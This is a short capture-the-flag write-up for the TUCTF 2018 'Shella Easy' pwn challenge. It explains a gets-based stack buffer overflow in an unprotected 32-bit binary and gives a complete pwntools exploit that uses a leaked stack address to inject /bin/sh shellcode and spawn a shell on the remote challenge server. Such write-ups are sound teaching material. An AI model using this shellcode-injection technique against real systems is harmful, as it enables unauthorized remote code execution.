[](ctf=tu-ctf-2018)
[](type=pwn)
[](tags=buffer-overflow)
[](tools=radare2,gdb-peda,pwntools,python)

# Shella Easy

We are given a [binary](../shella-easy) without any exploit mitigations.

```bash
vagrant@amy:~/share/shella_easy$ file shella-easy
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
```

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

The program has a call to `gets` and thus is a vanilla stack based buffer overflow. Exploitation allows us to get the flag from the server.

```python
from pwn import *

context(arch='i386', os='linux')
# p = process('./shella')
p = remote('52.15.182.55', 12345)

p.recvuntil("Yeah I'll have a ")
leak = p.recvuntil(' ').strip()
leak = int(leak, 16)

shellcode = asm(shellcraft.i386.sh())
shellcode = shellcode.ljust(64, '\x90')
shellcode += p32(0xdeadbeef)
shellcode += 'a' * 8
shellcode += p32(leak)
p.send(shellcode)
p.interactive()
```

Flag
> TUCTF{1_607_4_fl46_bu7_n0_fr135}
